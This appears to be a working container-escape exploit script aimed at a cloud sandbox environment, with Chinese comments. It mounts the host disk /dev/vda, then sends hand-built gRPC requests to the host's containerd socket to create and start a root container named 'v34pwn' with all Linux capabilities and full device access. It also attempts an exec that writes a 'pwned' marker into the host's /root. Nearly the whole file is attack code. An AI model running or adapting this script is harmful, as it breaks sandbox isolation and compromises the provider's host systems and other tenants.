# -*- coding: utf-8 -*-
"""vda34_ctrd_create: containerd API 创建 cell 级持久容器 (v34pwn)
P1: Containers/List 提取当前 snapshot_key + Snapshots/List 空 filter + Content/List
P2: Containers/Create v34pwn (复用现有 snapshot, spec=全 caps + 设备 rwm + sleep 99999)
P3: Tasks/Create v34pwn
P4: Tasks/Start v34pwn
P5: 验证: Tasks/List + task 目录 + init.pid + rootfs 挂载
P6: 尝试 Exec 到 v34pwn 写标记 (ExecRequest field2 谜题再试 string)
输出落盘 + 哨兵 V34S_DONE"""
import os, time, socket, ctypes, re, struct, subprocess, json

OUT = '/vercel/sandbox/v34s.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def curl_h2(sockpath, path, body, ctype='application/grpc', t=5, ns='default'):
    try:
        tmp = '/vercel/sandbox/curl_req_%d.bin' % os.getpid()
        hdr = '/vercel/sandbox/curl_hdr_%d.txt' % os.getpid()
        open(tmp, 'wb').write(body)
        cmd = ['curl', '-sS', '--max-time', str(t), '--http2-prior-knowledge',
               '--unix-socket', sockpath, '-X', 'POST',
               '-H', 'Content-Type: %s' % ctype, '-H', 'TE: trailers']
        if ns:
            cmd += ['-H', 'containerd-namespace: %s' % ns]
        cmd += ['-D', hdr, '--data-binary', '@%s' % tmp, 'http://unix%s' % path]
        r = subprocess.run(cmd, capture_output=True, timeout=t + 3)
        hdrtxt = ''
        try:
            hdrtxt = open(hdr, encoding='utf-8', errors='replace').read().replace('\n', ' | ')[:250]
        except Exception:
            pass
        return 'rc=%d HDR:%s' % (r.returncode, hdrtxt), r.stdout
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, b''


def grpc_env(payload=b''):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


def pstr(field_no, s):
    b = s.encode() if isinstance(s, str) else s
    return pvarint((field_no << 3) | 2) + pvarint(len(b)) + b


def pmsg(field_no, payload):
    return pvarint((field_no << 3) | 2) + pvarint(len(payload)) + payload


def pbool(field_no, v):
    return pvarint((field_no << 3)) + (b'\x01' if v else b'\x00')


def show(tag, out, raw=False):
    if not out:
        log('%s -> EMPTY' % tag)
        return
    if raw:
        log('%s -> %s' % (tag, out[:500].decode('utf-8', errors='replace').replace('\n', ' ')))
        return
    strs = re.findall(rb'[\x20-\x7e]{4,}', out)
    log('%s -> %s' % (tag, [s.decode(errors='replace') for s in strs[:20]]))


CSP = '/mnt/vdax/run/containerd/containerd.sock'
IMAGE = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'


def p1():
    log('=== P1 get snapshot key ===')
    rc, out = curl_h2(CSP, '/containerd.services.containers.v1.Containers/List', grpc_env(b''), t=4)
    log('Containers/List %s' % rc)
    show('Containers body', out)
    m = re.search(rb'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', out)
    ctr_id = m.group().decode() if m else 'unknown'
    m2 = re.search(rb'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}-snapshot', out)
    snap_key = m2.group().decode() if m2 else None
    log('current ctr_id=%s snap_key=%s' % (ctr_id, snap_key))
    # Snapshots/List 空 filter
    rc, out = curl_h2(CSP, '/containerd.services.snapshots.v1.Snapshots/List', grpc_env(b''), t=4)
    log('Snapshots/List %s' % rc)
    show('Snapshots body', out)
    # Content/List
    rc, out = curl_h2(CSP, '/containerd.services.content.v1.Content/List', grpc_env(b''), t=4)
    log('Content/List %s' % rc)
    show('Content body', out)
    return snap_key


def p2(snap_key):
    log('=== P2 Containers/Create ===')
    caps = ["CAP_AUDIT_CONTROL", "CAP_AUDIT_READ", "CAP_AUDIT_WRITE", "CAP_BLOCK_SUSPEND", "CAP_BPF",
            "CAP_CHECKPOINT_RESTORE", "CAP_CHOWN", "CAP_DAC_OVERRIDE", "CAP_DAC_READ_SEARCH", "CAP_FOWNER",
            "CAP_FSETID", "CAP_IPC_LOCK", "CAP_IPC_OWNER", "CAP_KILL", "CAP_LEASE", "CAP_LINUX_IMMUTABLE",
            "CAP_MAC_ADMIN", "CAP_MAC_OVERRIDE", "CAP_MKNOD", "CAP_NET_ADMIN", "CAP_NET_BIND_SERVICE",
            "CAP_NET_BROADCAST", "CAP_NET_RAW", "CAP_PERFMON", "CAP_SETFCAP", "CAP_SETGID", "CAP_SETPCAP",
            "CAP_SETUID", "CAP_SYS_ADMIN", "CAP_SYS_BOOT", "CAP_SYS_CHROOT", "CAP_SYS_MODULE", "CAP_SYS_NICE",
            "CAP_SYS_PACCT", "CAP_SYS_PTRACE", "CAP_SYS_RAWIO", "CAP_SYS_RESOURCE", "CAP_SYS_TIME",
            "CAP_SYS_TTY_CONFIG", "CAP_SYSLOG", "CAP_WAKE_ALARM"]
    spec = {
        "ociVersion": "1.0.2",
        "process": {
            "user": {"uid": 0, "gid": 0},
            "args": ["/bin/sh", "-c", "sleep 99999"],
            "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
                    "V34_PWNED=1"],
            "cwd": "/",
            "capabilities": {
                "bounding": caps, "effective": caps, "permitted": caps, "ambient": caps
            }
        },
        "root": {"path": "rootfs"},
        "mounts": [
            {"destination": "/proc", "type": "proc", "source": "proc"},
            {"destination": "/dev", "type": "tmpfs", "source": "tmpfs",
             "options": ["nosuid", "noexec", "nodev", "mode=755"]}
        ],
        "linux": {
            "resources": {"devices": [{"allow": True, "access": "rwm"}]},
            "cgroupsPath": "/v34pwn-ctr",
            "namespaces": [
                {"type": "mount"}, {"type": "pid"}, {"type": "uts"}, {"type": "ipc"}
            ]
        }
    }
    spec_json = json.dumps(spec).encode()
    runtime = pstr(1, 'io.containerd.runc.v2')
    any_spec = pstr(1, 'types.containerd.io/opencontainers/runtime-spec/1/Spec') + pstr(2, spec_json)
    ctr = pstr(1, 'v34pwn') + pstr(2, IMAGE) + pmsg(3, runtime) + pmsg(4, any_spec)
    ctr += pstr(5, 'overlayfs')
    if snap_key:
        ctr += pstr(6, snap_key)
    req = pmsg(1, ctr)
    log('Create req len=%d' % len(req))
    rc, out = curl_h2(CSP, '/containerd.services.containers.v1.Containers/Create', grpc_env(req), t=6)
    log('Containers/Create %s' % rc)
    show('Create body', out, raw=True)


def p3():
    log('=== P3 Tasks/Create ===')
    req = pstr(1, 'v34pwn')
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Create', grpc_env(req), t=6)
    log('Tasks/Create %s' % rc)
    show('CreateTask body', out, raw=True)


def p4():
    log('=== P4 Tasks/Start ===')
    req = pstr(1, 'v34pwn')
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Start', grpc_env(req), t=6)
    log('Tasks/Start %s' % rc)
    show('Start body', out, raw=True)


def p5():
    log('=== P5 verify ===')
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/List', grpc_env(b''), t=4)
    log('Tasks/List %s' % rc)
    show('Tasks body', out)
    td = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default/v34pwn'
    try:
        log('task dir: %s' % sorted(os.listdir(td)))
        for fn in ['init.pid', 'config.json']:
            fp = os.path.join(td, fn)
            try:
                if fn == 'init.pid':
                    log('init.pid: %s' % open(fp).read().strip())
                else:
                    head = open(fp, 'rb').read(1500).decode('utf-8', errors='replace')
                    log('config head: %s' % head[:600].replace('\n', ' '))
            except Exception as e:
                log('%s ERR %s' % (fn, e))
        rf = os.path.join(td, 'rootfs')
        if os.path.isdir(rf):
            log('rootfs exists: %s' % sorted(os.listdir(rf))[:15])
    except Exception as e:
        log('task dir ERR %s' % e)


def p6():
    log('=== P6 Exec probe ===')
    # ExecRequest: container_id=1, exec_id=2, spec=3, stdin=4, stdout=5, stderr=6, terminal=7
    exspec = json.dumps({
        "ociVersion": "1.0.2",
        "process": {"user": {"uid": 0, "gid": 0},
                    "args": ["/bin/sh", "-c",
                             "mount /dev/vda /mnt 2>/dev/null; echo v34-exec-pwned > /mnt/root/.v34_exec_marker 2>/dev/null; sleep 1"],
                    "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],
                    "cwd": "/",
                    "capabilities": {"bounding": ["CAP_SYS_ADMIN", "CAP_MKNOD", "CAP_DAC_OVERRIDE"],
                                     "effective": ["CAP_SYS_ADMIN", "CAP_MKNOD", "CAP_DAC_OVERRIDE"],
                                     "permitted": ["CAP_SYS_ADMIN", "CAP_MKNOD", "CAP_DAC_OVERRIDE"],
                                     "ambient": ["CAP_SYS_ADMIN", "CAP_MKNOD", "CAP_DAC_OVERRIDE"]}}
    }).encode()
    req = pstr(1, 'v34pwn') + pstr(2, 'v34exec1')
    req += pmsg(3, pstr(1, 'types.containerd.io/opencontainers/runtime-spec/1/Spec') + pstr(2, exspec))
    req += pbool(4, False) + pbool(5, False) + pbool(6, False) + pbool(7, False)
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Exec', grpc_env(req), t=6)
    log('Tasks/Exec %s' % rc)
    show('Exec body', out, raw=True)
    # 即使 Exec 失败, 直接检查 marker
    try:
        mk = '/mnt/vdax/root/.v34_exec_marker'
        log('exec marker exists: %s' % os.path.exists(mk))
    except Exception as e:
        log('marker chk ERR %s' % e)


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    sk = p1()
    p2(sk)
    p3()
    p4()
    p5()
    p6()

    log('V34S_DONE')
    f.close()


if __name__ == '__main__':
    main()
